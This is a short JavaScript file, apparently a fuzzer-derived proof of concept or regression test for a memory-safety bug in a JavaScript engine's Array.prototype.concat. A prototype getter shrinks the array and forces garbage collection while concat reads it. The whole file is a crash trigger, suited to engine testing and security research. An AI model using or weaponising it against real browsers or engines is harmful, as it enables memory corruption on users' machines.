function gc() {
    for (let i2 = 0; i2 < ((1024 * 1024) / 16); i2++) {
        const v13 = new String();
        var a = v13;
    }
}
const v17 = new Array(10);
array = v17;
array[0] = 1.1;
array[2] = 2.1;
array[3] = 3.1;
var proto = {};
array.__proto__ = proto;
const v32 = {
    get() {
        array.length = 1;
        gc();
        return "value from proto";
    },
    set(a31) {
    },
};
Object.defineProperty(proto, 1, v32);
Array.prototype.concat.call(array);
